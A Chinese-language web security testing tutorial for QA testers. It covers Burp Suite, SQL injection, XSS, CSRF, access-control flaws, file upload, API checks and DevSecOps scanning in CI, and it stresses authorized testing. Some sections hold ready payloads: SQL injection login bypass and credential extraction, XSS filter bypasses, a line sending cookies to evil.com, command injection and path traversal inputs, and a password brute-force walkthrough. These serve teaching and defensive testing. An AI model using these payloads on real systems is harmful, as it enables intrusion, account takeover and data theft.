---
description: Web 安全测试教程，Burp Suite、SQL 注入、XSS 和越权测试。
---
# Web 安全测试教程（软件测试人员专用）

> 本教程面向软件测试工程师，讲解 Web 安全测试的核心知识、常见漏洞原理与实战验证方法，覆盖 Burp Suite 使用、SQL 注入、XSS、越权等高频安全测试场景。

<div class="tutorial-meta">
    <span class="difficulty-badge difficulty-intermediate">📙 进阶难度</span>
    <span class="meta-item">⏱ 约 2 天</span>
    <span class="meta-item">📋 前置：HTTP 协议、接口测试基础</span>
    <span class="meta-item">🎯 目标：掌握常见 Web 漏洞的测试方法</span>
</div>

| 项目 | 要求 | 获取方式 |
|------|------|----------|
| HTTP 协议 | 了解请求方法、状态码、请求头与响应体 | [网络知识教程-软件测试版](../工具操作/网络知识教程-软件测试版.md) |
| 接口测试基础 | 了解接口测试流程、用例设计方法 | [接口测试完整教程-软件测试版](../专项测试/接口测试完整教程-软件测试版.md) |

---

## 新手导读

安全测试对新手来说不要一开始追求“攻击技巧”。测试人员更应该先建立风险意识：哪些输入不可信、哪些接口需要权限、哪些数据不能泄露。

第一遍重点掌握：

1. 越权：能不能访问别人的数据。
2. SQL 注入：输入是否被当成 SQL 执行。
3. XSS：输入是否被当成页面脚本执行。
4. 敏感信息泄露：密码、Token、身份证等是否暴露。
5. 安全测试必须在授权环境进行。

不要在真实网站或未授权系统上练习攻击类操作。

### 版本与维护说明

| 项目 | 说明 |
|------|------|
| 适用范围 | Web 安全基础、OWASP Top 10、Burp Suite、接口安全验证 |
| 使用建议 | 只在授权测试环境练习，优先验证越权、认证、敏感信息和输入校验 |
| 更新提醒 | OWASP 分类、Burp 菜单和浏览器安全策略会变化，正式测试前核对官方资料和团队安全规范 |

---
## 一、安全测试基础

### 1.1 测试人员为什么要学安全

- 接口暴露面越来越大（微服务、开放平台）
- 安全漏洞修复成本随阶段递增
- 测试是上线前最后防线
- 安全测试能力是高级测试工程师的必备技能

### 1.2 OWASP Top 10（2021）

| 排名 | 风险 | 说明 |
|------|------|------|
| A01 | 失效的访问控制 | 越权、IDOR（通过改 URL 中的 ID 访问他人数据） |
| A02 | 加密失败（Cryptographic Failures） | 敏感数据明文传输/存储 |
| A03 | 注入 | SQL、XSS、命令注入 |
| A04 | 不安全设计 | 架构层面缺陷 |
| A05 | 安全配置错误 | 默认密码、调试端口暴露 |
| A06 | 脆弱过时组件 | 旧版本依赖 |
| A07 | 身份验证失败（Identification and Authentication Failures） | 弱密码、暴力破解 |
| A08 | 软件和数据完整性失败 | 未验证的更新/CI |
| A09 | 日志和监控不足 | 无法发现攻击 |
| A10 | SSRF | 服务端请求伪造 |

### 1.3 测试人员的安全测试范围

```
开发负责：代码安全（输入校验、参数化查询、加密存储）
测试负责：黑盒验证（接口参数篡改、越权、注入、信息泄露）
安全团队：渗透测试、代码审计、漏洞扫描
```

测试人员重点做 **黑盒安全验证**，不需要写漏洞利用代码。

### 1.4 OWASP WSTG 测试框架映射

OWASP WSTG（Web Security Testing Guide）更像一份 Web 安全测试清单。新手可以不一次性学完全部细节，但要知道安全测试不只包含 SQL 注入和 XSS。

| WSTG 类别 | 测试人员要关注什么 | 常见验证方式 |
|-----------|--------------------|--------------|
| 信息收集 | 系统暴露了哪些入口、接口、版本、错误信息 | 浏览器 DevTools、Burp History、响应头检查 |
| 配置与部署管理 | 默认配置、调试页面、目录暴露、服务版本 | 访问常见路径、检查响应头、查看错误页面 |
| 身份认证测试 | 登录、密码策略、验证码、锁定、找回密码 | 错误密码、弱密码、验证码重放、锁定规则 |
| 会话管理测试 | Cookie、Session、Token 是否安全 | 退出后旧 token、过期 token、Cookie 属性 |
| 授权测试 | 普通用户能否访问他人数据或管理员接口 | 改 ID、换 token、直接请求隐藏接口 |
| 输入验证测试 | SQL 注入、XSS、命令注入、文件上传 | 特殊字符、脚本、非法文件、参数篡改 |
| 错误处理测试 | 报错是否泄露路径、SQL、堆栈、密钥 | 构造异常参数，观察错误响应 |
| 加密测试 | HTTPS、敏感信息传输和存储是否安全 | 抓包查看明文、检查证书和传输协议 |
| 业务逻辑测试 | 业务流程是否可绕过 | 重复提交、跳步、篡改金额、重复回调 |
| 客户端测试 | 前端存储、DOM XSS、跨域、点击劫持 | LocalStorage、CORS、iframe、前端脚本 |
| API 测试 | 接口鉴权、限流、数据暴露、参数校验 | Postman/Burp 重放、越权、批量请求 |

使用方式：

```text
第一步：列出本次功能涉及的入口和接口。
第二步：按 WSTG 类别筛出相关测试项。
第三步：为每个测试项准备数据和账号。
第四步：执行验证并保留请求、响应、截图和日志。
第五步：把高风险问题写成缺陷，把不确定点写成风险或疑问。
```

### 1.5 WSTG 落地示例：订单详情接口

目标接口：

```text
GET /api/orders/{orderId}
```

安全测试映射：

| WSTG 类别 | 测试点 | 预期 |
|-----------|--------|------|
| 身份认证 | 不带 token 请求订单详情 | 返回 401 或未登录 |
| 会话管理 | 使用过期 token 请求 | 返回 401，不返回订单数据 |
| 授权测试 | 用户 A 请求用户 B 的订单 ID | 返回 403、404 或无权限 |
| 输入验证 | orderId 传入字母、超长数字、特殊字符 | 返回参数错误，不报堆栈 |
| 错误处理 | 请求不存在订单 ID | 不泄露数据库 SQL 或服务路径 |
| 业务逻辑 | 已取消订单是否还能支付 | 不允许非法状态操作 |
| API 测试 | 批量枚举订单 ID | 有权限校验和必要限流 |

缺陷示例：

| 字段 | 内容 |
|------|------|
| 标题 | 普通用户可通过修改订单 ID 查看他人订单详情 |
| 严重级别 | Critical |
| 复现步骤 | 用户 A 登录后请求 `/api/orders/用户B订单ID` |
| 实际结果 | 返回用户 B 的订单金额、地址和手机号 |
| 期望结果 | 返回无权限，不返回任何用户 B 数据 |
| WSTG 分类 | 授权测试 / 水平越权 |

### 1.6 安全测试计划模板

```text
测试对象：
测试环境：
授权范围：
测试账号：
涉及接口：
不允许操作：

测试类别：
- 身份认证
- 会话管理
- 授权
- 输入验证
- 错误处理
- 业务逻辑
- 敏感信息

输出物：
- 安全测试记录
- 缺陷报告
- 风险清单
- 待确认问题
```

安全测试必须明确授权范围。没有授权的系统，即使只是“试一下”，也不要做攻击类验证。

---

## 二、Burp Suite 入门

### 2.1 什么是 Burp Suite

Burp Suite 是 Web 安全测试的 **核心工具**，功能：

- **Proxy**：拦截 HTTP/HTTPS 请求（类似 Fiddler，但更强大）
- **Repeater**：手动重放修改请求
- **Intruder**：自动化攻击（爆破、注入）
- **Scanner**：漏洞扫描（Pro 版）

### 2.2 安装

- 下载 Community Edition（免费）：`https://portswigger.net/burp/communitydownload`
- 需要 JDK 17+
- 安装后启动，选 Temporary Project → Next → Start Burp

### 2.3 配置浏览器代理

1. Burp 默认监听 `127.0.0.1:8080`
2. 浏览器配置代理：`127.0.0.1:8080`
3. 访问 `http://burp` 下载 CA 证书并安装
4. 浏览器访问 HTTPS 网站不再报证书错误

> 推荐用 **FoxyProxy** 浏览器扩展快速切换代理。

### 2.4 核心功能

**Proxy（代理拦截）：**
- 拦截请求，修改后放行
- HTTP history 查看所有请求

**Repeater（重放器）：**
- 拖入请求，修改参数，手动发送
- 观察响应变化

**Intruder（入侵器）：**
- 标记攻击位置（如密码字段）
- 加载字典（一个包含成千上万常用密码的文件，如 "123456"、"password"、"admin"）
- 自动逐个尝试，分析结果

> ⚠️ 字典爆破只能用于你有权限测试的系统，未经授权的暴力破解是违法的。

---

## 三、SQL 注入

### 3.1 原理

应用把用户输入直接拼接到 SQL 语句中，攻击者可插入 SQL 代码改变查询逻辑。

```python
# 不安全：字符串拼接
sql = f"SELECT * FROM users WHERE name = '{username}' AND pwd = '{password}'"

# 用户输入 username = "admin' OR '1'='1"
# 拼接后：SELECT * FROM users WHERE name = 'admin' OR '1'='1' AND pwd = ''
# 结果：绕过登录
```

> 为什么能绕过？正常 SQL 要 `name='admin' AND pwd='xxx'` 两个条件都成立。攻击者输入的 `'1'='1'` 永远为真，加上 `OR` 后整个条件变成"只要 name 是 admin 或 1=1 就行"——1=1 永远成立，所以不需要密码就能查出数据。

### 3.2 测试方法

**手动验证：**

在输入框或接口参数中输入：

```
' OR '1'='1
' OR 1=1--
admin' --
' UNION SELECT 1,2,3--
```

**观察响应：**
- 登录成功（绕过认证）→ 注入成功
- 返回数据异常多 → 注入成功
- 报错信息含 SQL 语句 → 存在注入点
- 响应时间异常（时间盲注）→ 可能存在注入

### 3.3 常见 Payload

```sql
-- 绕过登录
' OR '1'='1
' OR 1=1--
admin' --

-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- 报错说明只有 2 列

-- UNION 查询
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- 时间盲注
' OR SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0) --

-- 报错注入
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

### 3.4 防御验证

测试时验证开发是否用了参数化查询：

```python
# ✅ 安全：参数化查询
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))

# ❌ 不安全：字符串拼接
cursor.execute(f"SELECT * FROM users WHERE name = '{username}'")
```

---

## 四、XSS 跨站脚本

### 4.1 原理

应用把用户输入未转义就输出到页面，攻击者注入恶意脚本。

**类型：**
- **反射型**：输入在 URL 中，点击触发
- **存储型**：输入存数据库，所有人访问都触发（最危险）
- **DOM 型**：前端 JS 处理不当

### 4.2 测试方法

在输入框、URL 参数、评论区等输入：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

**观察：**
- 弹出 alert 框 → XSS 成功
- 查看页面源码，恶意代码是否被原样输出

### 4.3 测试 Payload

```html
<!-- 基础 -->
<script>alert(1)</script>

<!-- 绕过简单过滤 -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- 窃取 Cookie -->
<script>new Image().src="http://evil.com/?c="+document.cookie</script>

<!-- DOM 型 -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### 4.4 防御验证

检查输出是否被转义：

```html
<!-- ✅ 安全：特殊字符被转义 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- ❌ 不安全：原样输出 -->
<script>alert(1)</script>
```

---

## 五、CSRF 跨站请求伪造

### 5.1 原理

诱导已登录用户访问恶意页面，利用用户的登录态发起请求。浏览器会自动把目标网站的 Cookie 带上——不管你从哪个页面发起请求，只要是发往 bank.com，浏览器就会带上 bank.com 的 Cookie。CSRF 就是利用了这个机制。

```
用户已登录 bank.com
→ 访问恶意页面 evil.com
→ evil.com 页面自动发起请求 bank.com/transfer?to=hacker&amount=10000
→ 浏览器自动带上 bank.com 的 Cookie
→ 转账成功
```

### 5.2 测试方法

1. 登录目标网站，获取一个操作请求（如修改密码）
2. 构造恶意 HTML：

```html
<img src="http://target.com/change-password?new=123456">
```

3. 在另一个浏览器（或无痕窗口）打开该 HTML
4. 如果密码被修改 → CSRF 成功

**用 Burp 测试：**
- 在 Repeater 中去掉 Referer / Token 头
- 如果请求仍然成功 → 缺少 CSRF 防护

### 5.3 防御验证

检查是否有：
- CSRF Token（每次请求带随机 token）
- Referer / Origin 校验
- SameSite Cookie 属性

---

## 六、越权访问

### 6.1 水平越权（IDOR）

用户 A 访问用户 B 的资源。

```
正常：GET /api/user/1001/info  （用户 A 的 ID 是 1001）
越权：GET /api/user/1002/info  （改成用户 B 的 ID）
→ 如果返回用户 B 的信息 → 水平越权漏洞
```

**测试步骤：**
1. 用用户 A 登录，抓取请求
2. 修改请求中的用户 ID / 订单 ID 为用户 B 的
3. 观察是否返回 B 的数据

### 6.2 垂直越权

普通用户访问管理员接口。

```
普通用户 Token + 管理员接口：
POST /api/admin/deleteUser
Headers: Authorization: Bearer <普通用户Token>
Body: {"userId": 1001}

→ 如果用户被删除 → 垂直越权漏洞
```

### 6.3 测试要点

| 场景 | 测试方法 |
|------|---------|
| 查看他人数据 | 修改 URL 中的 ID |
| 操作他人资源 | 用 A 的 Token 操作 B 的资源 |
| 访问管理接口 | 用普通用户 Token 调管理接口 |
| 绕过前端限制 | 直接调接口（不经过页面按钮） |

---

## 七、敏感信息泄露

### 7.1 常见泄露点

| 泄露点 | 测试方法 |
|--------|---------|
| 接口返回多余字段 | 检查响应是否含手机号、身份证、密码 |
| 错误信息 | 故意触发错误，看是否暴露 SQL/堆栈/路径 |
| 前端源码 | F12 查看 JS 中是否有硬编码密钥 |
| 接口文档 | 尝试访问 /swagger-ui.html、/api-docs |
| 备份文件 | 尝试访问 .bak、.sql、.zip |
| Git 泄露 | 尝试访问 /.git/ |
| 默认页面 | 尝试访问 /actuator、/druid |

### 7.2 测试检查清单

- [ ] 响应中的敏感字段（密码、手机号、身份证）是否脱敏
- [ ] 错误信息是否暴露技术细节
- [ ] 前端 JS 中是否有密钥/Token
- [ ] 接口文档是否对外暴露
- [ ] HTTP 响应头是否泄露服务器信息（Server、X-Powered-By）
- [ ] 是否有 debug 模式开启

---

## 八、文件上传漏洞

### 8.1 测试要点

| 场景 | 测试方法 |
|------|---------|
| 绕过前端校验 | 直接用 Burp 修改请求上传 |
| 修改文件类型 | 改 Content-Type（如 image/jpeg） |
| 双扩展名 | test.php.jpg |
| 大小写绕过 | test.pHp |
| 00 截断 | test.php%00.jpg（旧系统中 %00 会截断文件名，实际存为 test.php） |
| 图片马 | 合法图片中嵌入恶意代码，如果服务器执行了这个"图片"就会中招 |
| 超大文件 | 上传 GB 级文件测试 DoS |

### 8.2 测试步骤

1. 正常上传一个 .jpg → 成功
2. 用 Burp 拦截，把文件名改为 `.php` → 看是否拒绝
3. 把 Content-Type 改为 `image/jpeg` → 看是否绕过
4. 上传包含恶意代码的图片 → 看是否被执行

---

## 九、接口安全测试

### 9.1 高频测试场景

| 场景 | 测试方法 |
|------|---------|
| 未认证访问 | 不带 Token 调接口 |
| Token 过期 | 用过期 Token |
| Token 篡改 | 修改 Token 中几位 |
| 暴力破解 | 用 Intruder 跑密码字典 |
| 短信轰炸 | 重放发送验证码接口 |
| 金额篡改 | 修改价格/金额参数 |
| 数量篡改 | 修改购买数量为负数/小数 |
| 重复提交 | 快速重放同一请求 |

### 9.2 Burp Intruder 爆破示例

1. 拦截登录请求
2. 发送到 Intruder
3. 标记密码字段为攻击位置 `$password$`
4. 加载密码字典（如 rockyou.txt）
5. 开始攻击
6. 按响应长度/状态码筛选正确密码——登录失败通常返回短错误提示，成功则返回用户数据和 Token（响应更长），按长度排序就能找到密码

### 9.3 验证限流

=== "Linux / Mac"

    ```bash
    for i in $(seq 1 100); do
      curl -s -o /dev/null -w "%{http_code}\n" \
        -X POST http://api.example.com/send-sms \
        -d '{"phone":"13800138000"}'
    done
    # 如果全部返回 200 → 无限流，存在短信轰炸风险
    ```

=== "Windows PowerShell"

    ```powershell
    1..100 | ForEach-Object {
      $r = Invoke-WebRequest -Uri "http://api.example.com/send-sms" -Method POST -Body '{"phone":"13800138000"}' -ContentType "application/json"
      Write-Output $r.StatusCode
    }
    ```

---

## 十、安全测试 Checklist

### 10.1 认证与授权

- [ ] 未认证访问需登录的接口 → 应返回 401
- [ ] 用过期 Token 访问 → 应返回 401
- [ ] 水平越权：用 A 的 Token 访问 B 的数据
- [ ] 垂直越权：用普通用户访问管理接口
- [ ] 密码是否加密传输（HTTPS）
- [ ] 登录失败是否有次数限制
- [ ] 是否有验证码防爆破

### 10.2 注入

- [ ] SQL 注入：输入 `' OR '1'='1`
- [ ] XSS：输入 `<script>alert(1)</script>`
- [ ] 命令注入：输入 `; ls`
- [ ] 路径遍历：输入 `../../etc/passwd`

### 10.3 数据安全

- [ ] 响应中敏感字段是否脱敏
- [ ] 是否有 HTTPS
- [ ] Cookie 是否有 Secure/HttpOnly 标志
- [ ] 密码是否明文存储（看数据库）

### 10.4 接口安全

- [ ] 高频调用是否限流
- [ ] 关键操作是否有幂等控制
- [ ] 文件上传类型/大小是否校验
- [ ] 接口文档是否对外暴露

### 10.5 配置安全

- [ ] 是否有默认密码
- [ ] debug 模式是否关闭
- [ ] 不必要的端口是否关闭
- [ ] 错误信息是否暴露技术细节

---

## 十一、常见问题排查

### 11.1 Burp 抓不到 HTTPS

- 安装 Burp CA 证书到浏览器/系统
- 检查代理设置是否正确
- 某些 App 有证书锁定，需配合 Frida

### 11.2 注入 Payload 被拦截

- WAF/防火墙可能拦截了关键字
- 尝试编码绕过（URL 编码、Unicode）
- 尝试大小写混合
- 尝试注释符分割：`UN/**/ION SEL/**/ECT`

### 11.3 不确定是否是漏洞

- 手动复现确认
- 查看 OWASP 官方定义
- 与开发沟通确认预期行为
- 不确定就提 Bug，让安全团队评审

### 11.4 安全测试的边界

- **测试环境测试**，不要对生产系统做注入
- 不要真的窃取数据
- 不要做 DoS 攻击（压测是另一回事）
- 发现漏洞后报告，不要利用

---

## 附录：安全测试工具

| 工具 | 用途 |
|------|------|
| **Burp Suite** | Web 安全测试核心 |
| **sqlmap** | 自动化 SQL 注入 |
| **Nmap** | 端口扫描 |
| **OWASP ZAP** | 免费 Web 安全扫描 |
| **Nikto** | Web 服务器扫描 |
| **dirb / dirsearch** | 目录枚举 |
| **Postman** | 接口安全测试 |

---

!!! info "测试纪律"
    安全测试必须在授权环境下进行。禁止对未授权系统进行渗透测试。发现的安全漏洞需及时上报，不得利用或传播。

## 十四、DevSecOps 集成

> 安全不应该在上线前才想起来，而应该融入整个开发流程——这就是 **DevSecOps（开发-安全-运维一体化）** 的核心理念。

### 14.1 什么是 DevSecOps

传统模式：开发完 → 测试完 → 最后才做安全检查 → 发现漏洞 → 返工（成本极高）

DevSecOps 模式：**安全左移**（Shift Left），在开发的每个阶段都嵌入安全检查：

| 阶段 | 传统做法 | DevSecOps 做法 |
|------|---------|---------------|
| 编码 | 不管安全 | IDE 安全插件实时提示 |
| 提交 | 不管安全 | Git Hooks 扫描密钥泄露 |
| 构建 | 不管安全 | SAST 静态扫描 + SCA 依赖检查 |
| 测试 | 上线前才查 | DAST 动态扫描 |
| 部署 | 手动检查 | 自动化安全门禁 |
| 运行 | 出事才响应 | 运行时监控 + WAF |

### 14.2 DevSecOps 流程图

```
代码提交 → 代码扫描(SAST) → 构建 → 依赖扫描(SCA) → 部署 → 动态扫描(DAST) → 运行时监控
   │            │              │          │              │          │              │
   │        SonarQube        Docker    Snyk/npm       K8s/云    OWASP ZAP      WAF/SIEM
   │        Semgrep          CI/CD     audit                                   日志告警
   └── git-secrets ──────────────────────────────────────────────────────────────────────┘
```

---

### 14.3 SAST（静态应用安全测试）

**原理**：在源码阶段发现安全问题，不需要运行程序。就像代码审查，但是自动化。

**常用工具**：

| 工具 | 特点 | 适用场景 |
|------|------|---------|
| **SonarQube** | 综合代码质量+安全 | Java/JS/Python 等多语言 |
| **Semgrep** | 轻量、规则灵活 | 团队自定义安全规则 |
| **Bandit** | Python 专用 | Python 项目安全扫描 |

**CI/CD 集成示例（GitLab CI）**：

```yaml
# .gitlab-ci.yml
sast-scan:
  stage: test
  image: python:3.11
  script:
    # Bandit 扫描 Python 代码安全问题
    - pip install bandit
    - bandit -r src/ -f json -o bandit-report.json
    # 如果发现高危漏洞则阻断流水线
    - bandit -r src/ --severity-level high --exit-code 1
  artifacts:
    paths:
      - bandit-report.json
```

**Semgrep 示例**：

```yaml
# .gitlab-ci.yml
semgrep-scan:
  stage: test
  image: semgrep/semgrep
  script:
    # 使用 OWASP 规则集扫描
    - semgrep --config=p/owasp-top-ten --json -o semgrep-report.json src/
  artifacts:
    paths:
      - semgrep-report.json
```

**常见扫描结果解读**：

```
Bandit 示例输出：
Issue: [B105:hardcoded_password_string] Possible hardcoded password
Severity: Medium   Confidence: Medium
File: src/config.py  Line: 15
→ 含义：代码中发现了硬编码的密码字符串，建议用环境变量替代
```

---

### 14.4 DAST（动态应用安全测试）

**原理**：在运行时扫描安全漏洞，不需要源码。像一个自动化黑客，对你的应用发各种攻击请求。

**常用工具**：

| 工具 | 特点 | 适用场景 |
|------|------|---------|
| **OWASP ZAP** | 免费开源 | CI/CD 自动化扫描 |
| **Burp Suite** | 功能全面 | 手动+自动化测试 |
| **Nuclei** | 模板化扫描 | 快速漏洞验证 |

**OWASP ZAP 自动化扫描配置**：

```bash
# 安装 ZAP（Docker 方式）
docker pull ghcr.io/zaproxy/zaproxy:stable

# 全自动扫描（适合 CI/CD）
docker run --rm \
  -v $(pwd)/report:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://target-app:8080 \
  -r report.html \
  -x report.xml

# 只爬虫+扫描 API（更快）
docker run --rm \
  -v $(pwd)/report:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t http://target-app:8080/api/swagger.json \
  -f openapi \
  -r api-report.html
```

**CI/CD 集成示例（GitLab CI）**：

```yaml
# .gitlab-ci.yml
dast-scan:
  stage: security
  image: ghcr.io/zaproxy/zaproxy:stable
  script:
    - zap-full-scan.py -t $TARGET_URL -r report.html -x report.xml
  artifacts:
    paths:
      - report.html
      - report.xml
  allow_failure: true  # DAST 扫描可能有误报，不阻断流水线
```

---

### 14.5 SCA（软件成分分析）

**原理**：检查项目依赖的第三方库是否有已知安全漏洞。你的代码没问题，但你引用的库可能有漏洞。

**真实案例**：
- **Log4Shell (2021)**：Log4j 远程代码执行漏洞，影响全球 35000+ Java 项目
- **event-stream (2018)**：npm 包被注入恶意代码，窃取比特币钱包

**常用工具**：

| 工具 | 适用 | 特点 |
|------|------|------|
| **Snyk** | 多语言 | 有免费版，自动修复建议 |
| **Dependabot** | GitHub | 自动创建 PR 修复漏洞 |
| **pip-audit** | Python | 轻量命令行工具 |
| **npm audit** | Node.js | 内置在 npm 中 |
| **Trivy** | 容器+代码 | 扫描镜像和文件系统 |

**实战：在 CI 中集成依赖扫描**：

```bash
# Python - pip-audit
pip install pip-audit
pip-audit  # 检查 requirements.txt 中的漏洞

# Node.js - npm audit
npm audit          # 显示漏洞
npm audit fix      # 自动修复
npm audit --json   # 输出 JSON 报告
```

```yaml
# .gitlab-ci.yml - 依赖扫描
dependency-scan:
  stage: security
  script:
    # Python 项目
    - pip install pip-audit
    - pip-audit --strict --desc
    # 如果有 high/critical 漏洞则失败
  allow_failure: false  # 依赖漏洞必须修复
```

**Snyk CI/CD 集成**：

```yaml
# .gitlab-ci.yml
snyk-scan:
  stage: security
  image: snyk/snyk:python
  script:
    - snyk test --severity-threshold=high
  variables:
    SNYK_TOKEN: $SNYK_API_TOKEN  # 在 CI/CD 变量中配置
```

---

### 14.6 密钥与敏感信息管理

**❌ 错误做法——把密钥写在代码里**：

```python
# 千万不要这样写！
DATABASE_PASSWORD = "MyS3cretPass"
API_KEY = "sk-1234567890abcdef"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**✅ 正确做法**：

```python
# 方法1：环境变量
import os
DB_PASSWORD = os.environ.get("DATABASE_PASSWORD")
API_KEY = os.environ.get("API_KEY")

# 方法2：.env 文件（不要提交到 Git！）
# .env 文件加入 .gitignore
from dotenv import load_dotenv
load_dotenv()
API_KEY = os.environ.get("API_KEY")
```

**密钥管理服务**：

| 服务 | 适用场景 |
|------|---------|
| **HashiCorp Vault** | 自建密钥管理 |
| **AWS Secrets Manager** | AWS 云环境 |
| **Azure Key Vault** | Azure 云环境 |
| **GCP Secret Manager** | GCP 云环境 |

**git-secrets 扫描**：

```bash
# 安装 git-secrets
# Mac
brew install git-secrets
# Linux
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets && sudo make install

# 在项目中配置
git secrets --install
git secrets --register-aws  # 添加 AWS 密钥模式

# 扫描整个仓库历史
git secrets --scan-history

# 手动添加自定义模式
git secrets --add 'password\s*=\s*.+'
git secrets --add 'api_key\s*=\s*.+'
```

**CI/CD 密钥扫描**：

```yaml
# .gitlab-ci.yml
secret-scan:
  stage: security
  script:
    # 使用 gitleaks 扫描 Git 历史中的密钥
    - docker run --rm -v $(pwd):/path zricethezav/gitleaks detect --source=/path --report-path=/path/gitleaks-report.json
  artifacts:
    paths:
      - gitleaks-report.json
```

---

### 14.7 安全测试在 CI/CD 中的落地

**质量门禁配置示例**：

```yaml
# .gitlab-ci.yml - 完整安全流水线
stages:
  - build
  - test
  - security
  - deploy

# 代码扫描（每次提交）
sast:
  stage: security
  script:
    - bandit -r src/ --severity-level high --exit-code 1
  rules:
    - if: $CI_MERGE_REQUEST_IID  # 只在 MR 时运行

# 依赖扫描（每次提交）
dependency-check:
  stage: security
  script:
    - pip-audit --strict
  rules:
    - if: $CI_MERGE_REQUEST_IID

# 密钥扫描（每次提交）
secret-detection:
  stage: security
  script:
    - gitleaks detect --source=. --exit-code 1

# DAST 扫描（部署到测试环境后）
dast:
  stage: security
  needs: ["deploy-to-staging"]
  script:
    - zap-full-scan.py -t $STAGING_URL -r report.html
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# 安全门禁：必须全部通过才能部署到生产
deploy-to-production:
  stage: deploy
  needs: ["sast", "dependency-check", "secret-detection", "dast"]
  script:
    - echo "All security checks passed, deploying to production..."
```

**安全扫描报告解读**：

```
漏洞优先级 = 严重程度（CVSS评分）× 可利用性 × 业务影响

CVSS 评分标准：
┌──────────┬──────────┬─────────────────────────┐
│  评分范围  │   等级   │         处理方式          │
├──────────┼──────────┼─────────────────────────┤
│ 9.0 - 10 │ Critical │ 必须立即修复，阻断发布    │
│ 7.0 - 8.9│   High   │ 24小时内修复             │
│ 4.0 - 6.9│  Medium  │ 一周内修复，记入待办      │
│ 0.1 - 3.9│   Low    │ 下个迭代修复             │
│    0     │   Info   │ 仅记录，不需要修复        │
└──────────┴──────────┴─────────────────────────┘
```

**安全门禁策略建议**：

```
Critical / High  → 阻断流水线，不允许合并/发布
Medium           → 警告但不阻断，创建 Issue 跟踪
Low / Info       → 仅在报告中记录
```

---

### 14.8 DevSecOps 工具链总结

```
┌─────────────────────────────────────────────────────────┐
│                    DevSecOps 工具链                       │
├──────────┬──────────────┬───────────────────────────────┤
│   阶段    │    工具       │           作用                │
├──────────┼──────────────┼───────────────────────────────┤
│  编码     │ IDE 插件      │ 实时安全提示                  │
│  提交     │ git-secrets  │ 防止密钥提交                  │
│  SAST    │ Semgrep      │ 代码安全扫描                  │
│  SCA     │ Snyk         │ 依赖漏洞检查                  │
│  DAST    │ OWASP ZAP    │ 运行时安全扫描                │
│  容器安全 │ Trivy        │ 镜像漏洞扫描                  │
│  运行时   │ WAF + SIEM   │ 实时监控与告警                │
└──────────┴──────────────┴───────────────────────────────┘
```

> 💡 **给测试工程师的建议**：DevSecOps 不是让测试人员一个人扛所有安全工作，而是让整个团队（开发、测试、运维）共同参与安全。测试工程师在其中的角色是：**推动安全测试落地、解读扫描报告、验证漏洞修复**。

---

### 推荐下一步

根据你的学习进度，选择下一步：

1. **如果你想做接口测试实战**：进入 [接口自动化项目实战](../项目实战/接口自动化项目实战.md)，搭建完整测试框架
2. **如果你想进入自动化**：学习 [Python 接口自动化](../自动化测试/Python+Requests+Allure接口自动化教程-软件测试版.md)，用 Requests + Pytest 搭框架
3. **如果你想做电商实战**：进入 [电商系统测试实战](../项目实战/电商系统测试实战.md)，体验完整测试流程

### 通关检查

完成本阶段后，使用 [第3阶段-专项测试通关](../学习中心/第3阶段-专项测试通关.md) 检查是否可以进入下一阶段。
